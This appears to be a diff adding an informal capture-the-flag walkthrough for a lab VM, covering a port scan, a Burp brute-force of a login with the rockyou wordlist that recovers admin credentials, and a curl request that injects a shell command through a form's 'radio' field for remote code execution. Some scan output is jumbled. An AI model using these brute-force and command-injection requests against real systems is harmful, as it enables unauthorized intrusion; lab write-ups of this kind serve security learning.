@@ -1,0 +1,88 @@
+---
+
+---
+
+# discover
+
+find ip
+
+192.168.31.241  00:0c:29:2d:55:4f       VMware, Inc.
+
+rustscan 
+``` bash
+rustscan 192.168.31.241 --ulimit 5000 -- -A
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+Faster Nmap scanning with Rust
+Disk Usage lovely
+ jessica
+1 of 1 target successfully completed, 16 valid passwords found
+```
+> for format is 
+>``` bash
+>sed 's/ //g'
+>```
+>
+>or
+>
+>``` bash
+>cut -d " " -f 2
+>```
+>
+>
+>
+>
+
+so possible pass is in list
+we can burp it
+
+all fail ..
+
+
+i find wrong way.i found that
+```
+$ curl "http://192.168.31.241//command.php"       
+<html>
+<head>
+<title>System Tools - Command</title>
+<link rel="stylesheet" href="css/styles.css">
+</head>
+
+<body>
+        <div class="container">
+           
+Disk Usage     <div class="inner">
+
+
+                        <form method="post" action="command.php">
+                                <strong>Run Command:</strong><br>
+                                <input type="radio" name="radio" value="ls -l" checked="checked">List Files<br />
+                                <input type="radio" name="radio" value="du -h">Disk Usage<br />
+                                <input type="radio" name="radio" value="df -h">Disk Free<br />
+                                <p>
+                                <input type="submit" name="submit" value="Run">
+                        </form>
+
+                        You need to be logged in to use this system.<p><a href='index.php'>Click to Log In Again</a>
+                </div>
+        </div>
+</body>
+</html>                        
+```
+
+seem it force me to login?
+and i run my burp pro and
+works
+wordlist is rockyou.txt in kali
+username = admin
+password = happy
+
+
+and copy the url as curl in web broswer
+
+$ curl 'http://192.168.31.241/command.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.31.241' -H 'Connection: keep-alive' -H 'Referer: http://192.168.31.241/command.php' -H 'Cookie: PHPSESSID=alidntd129mheml2nuvpq649n5' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'radio=ls+/&submit=Run'
+
+edit the radio var can RCE
+
